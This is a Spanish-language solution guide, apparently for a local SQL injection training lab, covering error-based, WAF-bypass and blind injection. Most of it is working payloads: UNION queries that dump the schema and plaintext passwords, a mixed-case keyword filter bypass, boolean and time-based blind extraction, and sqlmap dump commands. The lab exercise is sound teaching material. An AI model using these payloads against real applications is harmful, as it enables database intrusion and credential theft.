Easy — Error-based (sin WAF)

  1. Verifica la inyección — devuelve todos los productos: 
    ' OR '1'='1
  2. Extrae la estructura de la base de datos: 
    ' UNION SELECT 0,name,sql,3,4 FROM sqlite_master-- -
  3. Extrae datos sensibles de la tabla users: 
    ' UNION SELECT 0,username,password_plain,3,4 FROM users-- -
  4. Obtén la versión de la base de datos: 
    ' UNION SELECT 0,sqlite_version(),3,4,5 FROM products-- -
  5. Obtén el nombre de la base de datos: 
    ' UNION SELECT 0,name,2,3,4 FROM pragma_database_list-- -
  6. Enumera todas las tablas del schema: 
    ' UNION SELECT 0,name,2,3,4 FROM sqlite_master WHERE type='table'-- -
  7. Enumera las columnas de la tabla users: 
    ' UNION SELECT 0,name,type,3,4 FROM pragma_table_info('users')-- -
  8. O automatiza con sqlmap: 
    sqlmap -u "http://localhost:5000/sqli/search?q=test" -p q --dbms=SQLite --technique=U --level=5 --risk=3 --batch --dump

Medium — Bypass de blacklist

  1. El WAF bloquea palabras clave en minúsculas. Bypassea con mayúsculas mixtas: 
    ' UnIoN SeLeCt 0,username,password_plain,3,4 FROM users-- -
  2. O usa sqlmap con tamper de randomcase: 
    sqlmap -u "http://localhost:5000/sqli/search?q=test" -p q --dbms=SQLite --technique=U --tamper=randomcase --level=5 --risk=3 --batch --dump

Hard — Blind (boolean-based + time-based)

  1. No se muestran errores. Usa boolean-based blind para extraer carácter a carácter: 
    ' UNION SELECT 0, (CASE WHEN (SELECT SUBSTR(password_plain,1,1) FROM users WHERE username='admin')='a' THEN 'TRUE' ELSE 'FALSE' END), 2, 3, 4 FROM products-- -
    Si ves "TRUE" en la tabla, el carácter es correcto. Cambia el carácter hasta que la consulta devuelva "TRUE".
  2. Time-based blind con SQLite (randomblob genera delay): 
    ' UNION SELECT 0, (CASE WHEN (SELECT SUBSTR(password_plain,1,1) FROM users WHERE username='admin')='a' THEN randomblob(300000000) ELSE 'x' END), 2, 3, 4 FROM products-- -
    Si la condición es verdadera, la página tarda mucho en cargar; si es falsa, responde rápido. El valor mostrado será siempre "x". Observa el tiempo de respuesta, no el contenido.
  3. Automatiza con sqlmap especificando las técnicas blind: 
    sqlmap -u "http://localhost:5000/sqli/search?q=test" -p q --dbms=SQLite --technique=BT --level=5 --risk=3 --batch --dump
  4. Automatiza la extracción time-based con el script incluido: 
    python3 static/scripts/sqli_timebased_extractor.py http://localhost:5000
    El script detecta automáticamente la IP/URL objetivo y extrae la contraseña usando retardos de tiempo.
